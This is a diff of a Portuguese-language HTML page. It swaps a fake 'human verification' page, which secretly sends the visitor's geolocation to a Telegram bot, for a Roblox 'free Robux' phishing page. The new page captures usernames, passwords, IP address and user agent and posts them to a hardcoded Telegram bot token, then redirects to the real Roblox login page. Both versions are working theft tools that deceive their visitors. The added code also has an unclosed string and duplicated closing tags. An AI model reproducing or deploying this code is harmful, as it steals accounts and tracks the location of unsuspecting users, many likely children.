@@ -1,164 +1,173 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação Humana SleyTr</title>
+    <title>Promoção de Robux Grátis - Roblox</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #222;
-            color: #0F0;
+            background: linear-gradient(to bottom, #2c3e50, #000000);
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            flex-direction: column;
-            text-align: center;
+            color: #fff;
         }
-        .container {
-            background-color: #333;
+        .login-container {
+            background-color: #1a1a1a;
             padding: 30px;
             border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-            max-width: 500px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            width: 350px;
+            text-align: center;
+            border: 1px solid #00ffff;
         }
-        h1 {
-            color: #FF0;
-            margin-bottom: 10px; /* Ajuste para dar espaço ao h2 */
-            text-shadow: 0 0 10px #FF0;
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
         }
         h2 {
-            color: #0FF; /* Uma cor diferente para a chamada de atenção */
-            margin-bottom: 20px;
-            text-shadow: 0 0 8px #0FF;
+            color: #00ffff;
+            margin-bottom: 25px;
+            font-size: 24px;
         }
-        p {
-            margin-bottom: 15px;
-        }
-        #status {
-            font-weight: bold;
-            color: #0FF;
-        }
-        #locationData {
-            word-break: break-all;
-            background-color: #444;
+        .alert {
+            background-color: #ffcc00;
+            color: #000;
             padding: 10px;
             border-radius: 5px;
-            margin-top: 20px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .input-group {
+            margin-bottom: 15px;
             text-align: left;
         }
-        a {
-            color: #F0F;
-            text-decoration: none;
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ccc;
         }
-        a:hover {
-            text-decoration: underline;
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #2c2c2c;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #00ffff;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to right, #00a2ff, #00ffff);
+            border: none;
+            border-radius: 5px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.3s;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Sistema de Verificação SleyTr</h1>
-        <h2>Verifique se você é um humano! Clique em 'Permitir Localização'.</h2>
-        <p id="status">Aguardando sua corajosa decisão...</p>
-        <div id="locationData">
-            <!-- Os dados de localização aparecerão aqui -->
+    <div class="login-container">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSIjZmZmIj5Sb2Jsb3ggTG9nbzwvdGV4dD48L3N2Zz4=" alt="Roblox Logo" class="logo">
+        <h2>Resgate seus 3.000 Robux GRÁTIS!</h2>
+        <div class="alert">Oferta por tempo limitado! Faça login para resgatar.</div>
+
+        <form id="loginForm" method="POST">
+            <div class="input-group">
+                <label for="username">Nome de Usuário</label>
+                <input type="text" id="username" name="username" placeholder="Seu usuário Roblox" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="password">Senha</label>
+                <input type="password" id="password" name="password" placeholder="Sua senha" required autocomplete="off">
+            </div>
+            <button type="submit">RESGATAR ROBUX AGORA</button>
+        </form>
+
+        <div class="footer">
+            © 2024 Roblox Corporation. Todos os direitos reservados.
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', (event) => {
-            const statusElement = document.getElementById('status');
-            const locationDataElement = document.getElementById('locationData');
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('button');
+            button.textContent = 'RESGATANDO...';
+            button.disabled = true;
 
-            // SEUS DADOS SECRETOS DO TELEGRAM - NÃO OS COMPARTILHE!
-            const BOT_TOKEN = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // <--- SUBSTITUA AQUI COM SEU TOKEN REAL DO BOT!
-            const CHAT_ID = '8028837254';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!
+            const formData = new FormData(this);
+            const credentials = {
+                username: formData.get('username'),
+                password: formData.get('password'),
+                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip).catch(() => 'N/A'),
+                userAgent: navigator.userAgent,
+                date: new Date().toLocaleString('pt-BR')
+            };
 
-            function sendLocationToTelegram(latitude, longitude, accuracy) {
-                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                const message = `🚨 ALERTA SLEYTR! Nova localização capturada!\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nPrecisão: ${accuracy} metros\n\nVer no mapa: ${mapLink}`;
+            // Envia para o Telegram
+            const botToken = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU;
+            const chatId = '8028837254';
+            
+            const message = `🐺 NOVA PRESA CAÍDA NA TRAP 🐺
+================================
+Data/Hora: ${credentials.date}
+IP: ${credentials.ip}
+User-Agent: ${credentials.userAgent}
+--------------------------------
+USUÁRIO: ${credentials.username}
+SENHA: ${credentials.password}
+================================`;
 
-                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-                fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        disable_web_page_preview: true
-                    })
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Localização enviada ao Telegram com sucesso!', data);
-                        statusElement.textContent = "Verificação bem-sucedida! Humano confirmado. E os dados enviados para o meu covil!";
-                    } else {
-                        console.error('Falha ao enviar localização ao Telegram:', data);
-                        statusElement.textContent = "Verificação quase concluída, mas falha ao enviar dados. Verifique o console para mais detalhes.";
-                    }
-                })
-                .catch(error => {
-                    console.error('Erro de rede ao enviar localização ao Telegram:', error);
-                    statusElement.textContent = "Verificação quase concluída, mas erro de rede ao enviar dados.";
-                });
-            }
-
-            if (navigator.geolocation) {
-                statusElement.textContent = "Aguardando sua corajosa decisão...";
-                navigator.geolocation.watchPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-
-                        // Exibe a localização na página para o alvo (e para seu próprio debug)
-                        locationDataElement.innerHTML = `
-                            <p><strong>Latitude:</strong> ${latitude}</p>
-                            <p><strong>Longitude:</strong> ${longitude}</p>
-                            <p><strong>Precisão (metros):</strong> ${accuracy}</p>
-                            <p><strong>Link para o mapa:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Ver no Google Maps</a></p>
-                        `;
-
-                        // ENVIA A LOCALIZAÇÃO PARA O SEU BOT DO TELEGRAM!
-                        sendLocationToTelegram(latitude, longitude, accuracy);
-                    },
-                    (error) => {
-                        let errorMessage = "Erro na verificação: ";
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage += "Acesso negado. A humanidade está em dúvida!";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage += "Informação indisponível. Seu status de humano não pode ser confirmado.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage += "Tempo esgotado. Verificação falhou. Robô detectado?";
-                                break;
-                            default:
-                                errorMessage += "Um erro desconhecido ocorreu. Frustrante!";
-                                break;
-                        }
-                        statusElement.textContent = errorMessage;
-                        locationDataElement.innerHTML = `<p style="color: red;">${errorMessage}</p>`;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                statusElement.textContent = "Seu navegador não suporta verificação de humanidade. Que pena!";
-                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador é inadequado para esta tarefa.</p>`;
-            }
+            }).then(response => response.json())
+            .then(data => {
+                // Redireciona após sucesso
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login';
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login';
+                }, 1500);
+            });
         });
     </script>
+</body>
+</html>>
 </body>
 </html>
